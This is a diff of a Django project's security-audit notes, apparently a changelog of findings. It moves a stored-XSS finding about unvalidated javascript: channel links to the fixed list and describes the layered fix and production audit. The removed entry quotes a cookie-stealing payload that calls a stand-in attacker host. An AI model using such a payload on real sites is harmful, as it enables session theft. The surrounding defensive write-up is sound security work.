@@ -18,22 +18,6 @@ deployed the same day; see Done.
 
 ### High
 
-- [ ] **A `javascript:` link imported from a channel list reaches the page's `href`
-  unvalidated — stored XSS.** `ChannelLink.link` declares `validators=[validate_channel_link]`
-  and that validator does reject the payload, but **Django only runs field validators from
-  `full_clean()`, which `Model.save()` never calls — and there is not a single `full_clean()`
-  call in the codebase.** The import path uses `ChannelLink.objects.update_or_create(link=...)`,
-  so the validator added for exactly this purpose is dead code outside the admin form.
-  Reproduced end to end: importing `javascript:fetch('https://evil.example/'+document.cookie)`
-  stores it and `link_button.html` renders `href="javascript:..."`; a `data:text/html;base64,…`
-  URI gets through the same way. Escaping does not help — the payload is the URL, not
-  markup. It fires on click, and `target="_blank"` is only applied to `http` schemes, so it
-  runs in the page's own origin. The input is third-party: `newera.txt`, `elcano.txt` and
-  `.m3u` files come from outside. Fix: enforce the scheme where the data enters
-  (`import_entries`), not only in the admin — either by calling `full_clean()` or by
-  filtering before the upsert — and add a template-side guard so a row already in the
-  database cannot render a dangerous scheme. Existing rows need auditing. *(verified)*
-
 - [ ] **`.env.production` — which holds `DJANGO_SECRET_KEY` — is baked into the Docker
   image.** `.dockerignore` lists `.env`, and that pattern matches only that exact
   filename, not `.env.production` or `.env.production.local`; `COPY . .` then copies all
@@ -128,6 +112,16 @@ the git history. Kept here as an index of what has been through this file.
   Deleted `channel_matchers.py`, 320 dead lines Django was advertising as a command.
 - **Scraper reporting** (0.3.0, 2026-08-10) — events whose time is not yet announced are
   counted and named instead of being silently folded into `skipped`.
+- **Stored XSS through channel link schemes** (2026-08-11) — `ChannelLink.link` declared
+  a validator that never ran, because Django only invokes field validators from
+  `full_clean()` and the importer writes through `update_or_create`, so a `javascript:`
+  or `data:` URI from a third-party channel list reached the rendered `href` and ran in
+  the site's own origin on click. Fixed in three layers: `save()` vets the link field,
+  the importer reports and steps over a rejected entry instead of abandoning the run, and
+  the template renders no anchor for a disallowed scheme, which is what covers a row
+  inserted by `bulk_create`, a migration or a fixture. Production was audited first (381
+  links, all `acestream`, none dangerous) and the button counts on `/channels/` and
+  `/agenda/` are unchanged after the deploy.
 - **Security audit, critical findings** (2026-08-11) — Pillow 12.1.0 was in range for two
   CVEs that can reach arbitrary code execution through a crafted PSD, and this project
   hands Pillow bytes fetched from scraped URLs, where the extension is no protection
